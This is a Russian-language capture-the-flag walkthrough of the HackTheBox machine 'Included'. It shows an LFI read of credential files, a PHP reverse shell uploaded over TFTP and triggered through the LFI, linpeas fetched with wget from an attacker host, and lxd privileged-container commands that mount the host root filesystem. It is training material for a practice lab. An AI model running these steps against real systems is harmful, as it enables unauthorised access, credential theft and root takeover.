# HTB Starting Point Tier 2: Included

- **Difficulty:** Very Easy
- **Дата:** 14.01.2026
- **Цель:** Практика LFI уязвимостей, обратного шелла, linpeas и повышение привлегий с помощью контейнеров

## 1. Recon & Enumeration
- Nmap, UDP-сканирование, запускаем с `-sU`, и можно чуть шумнее и быстрее с `-T4`, ибо UDP сканирование работает значительно дольше: `sudo nmap -sU -sC -sV -v -T4 $ip`. Находим открытый порт `69`, на котором запущен `TFTP`. `TFTP` – упрощенный протокол передачи файлов, предназначенный для быстрой и простой передачи небольших файлов. Сделав также TCP-сканирование, обнаруживаем открытый порт `80`, бежим смотреть на веб-страничку.
- Веб-страница имеет вид `http://ip/?file=home.php`, сразу проверяем ее на наличие LFI-уязвимости: `/?file=/etc/passwd`, и да, конечный файл открывается, LFI-уязвимость имеетеся.
- Что вообще такое LFI-уязвимость? `Local File Inclusion (LFI)` — это уязвимость веб-приложений, при которой злоумышленник может заставить сервер включить и выполнить локальные файлы, к которым у него не должно быть доступа, обычно через плохо очищенные пользовательские входные данные в путях к файлам.
- Попробуем добраться до .htpasswd по следующему пути: `/?file=/var/www/html/.htpasswd`, и снова успех, мы получаем креды пользователя Mike

## 2. Exploitation
- Изучив документация TFTP, узнаем, что дефолтный системный путь `/var/lib/tftpboot/`. В теории мы можем через терминал отгрузить туда обратный шелл, а с помощью LFI-уязвимости запустить его, пробуем!
- Обратный шелл берем отсюда, [тык!](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), меняем ip и port, port ставим такой же как и на слушателе: `nc -lvnp port`. В терминале коннектимся к TFTP: `tftp ip` и попадаем в ее облочку, дальше простой командой `put`, отправляем наш обратный шелл на сервер: `put php-reverse-shell.php`, выходим. Запускаем шелл: `http://ip/?file=/var/lib/tftpboot/php-reverse-shell.php`, возвращаемся в слушателю и получаем обратный шелл в своем терминале! Мы `www-data`
- Для удобства командой `python3 -c 'import pty; pty.spawn("/bin/bash")'` создаем интерактивную оболочку с полноценным управлением терминалом
- Помним, что ранее мы нашли креды пользователя Mike, сменим пользователя на него: `su mike`, вводим, полученный ранее пароль, и мы - Mike! Сразу ищем user-флаг: `find / -name "user.txt" 2>/dev/null`. User-флаг получен, едем в privesc.

## 3. Privilege Escalation
- Понимая, что тачка уровня **Easy**, в этом write-up'e, хотел бы показать, как использовать `LinPEAS`. LinPEAS — это скрипт для поиска уязвимостей на Linux-серверах и контейнерах, скачиваем [отсюда](https://github.com/peass-ng/PEASS-ng/releases/tag/20260114-2f321ee3)
- Далее нам нужно его как-то отправить на уязвимую машину. На атакующей машине поднимаем простой встроенный HTTP-сервер на Python 3: `python3 -m http.server`, который дефолтно поднимется на 8000 порту и откроет доступ к файлам из текущей директории.
- На атакуемой тачке под пользователем mike загружаем linpeas с нашей атакующей машины в директорию /tmp: `wget http://attacker_ip:8000/linpeas.sh`, делаем файл исполняемым: `chmod + x linpeas.sh`, и запускам сам скрипт: `./linpeas.sh`. После некоторого ожидания, когда скрипт отработает нас, в большинстве случае, будут интересовать поля `RED/YELLOW: 95% a PE vector`.
- Находим одно из таких: `uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)`, где `lxd` подсвечено как потенциальная уязвимость повышения привелегий. `LXD` — это демон для управления Linux-контейнерами (на базе LXC), а членство пользователя в группе lxd (gid=108) даёт возможность запускать привилегированные контейнеры с root-доступом к файловой системе хоста, что позволяет повысить привилегии до root.
- Возьмем готовый контейнер на свою, атакующую машину: `git clone https://github.com/saghul/lxd-alpine-builder.git`. По аналогии, как мы отгружали linpeas, таким же образом грузим этот контейнер на тачку жертвы. Импортируем этот контейнер в среду lxd и присваиваем ему имя: `lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias privesccont`, дальше выполняем следующие команды друг за другом:
  - `lxc init privesccont ignite -c security.privileged=true`
  - `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`
  - `lxc start ignite`
  - `lxc exec ignite /bin/sh`
 - Переходим в /mnt/root, и все, мы в рутовой директории, где и лежит root-flag!

## Done
Тачка действительно Easy, все шло своим чередом, с первого раза, друг за другом. Немножко пришлось погуглить за повышение привелегий через контейнеры, но в общем и целом тачка интересная, лайк!
